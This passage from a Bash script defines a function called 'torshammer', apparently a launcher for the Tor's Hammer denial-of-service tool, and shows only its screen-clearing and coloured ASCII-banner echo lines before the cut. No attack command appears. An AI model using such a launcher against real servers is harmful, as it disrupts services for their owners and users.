torshammer()
{
    clear
    echo -e " ${BLUE} "
    echo -e "${RED}▄▄▄▄▄      ▄▄▄  .▄▄ ·  ▄ .▄ ▄▄▄· • ▌ ▄ ·. • ▌ ▄ ·. ▄▄▄ .▄▄▄  "
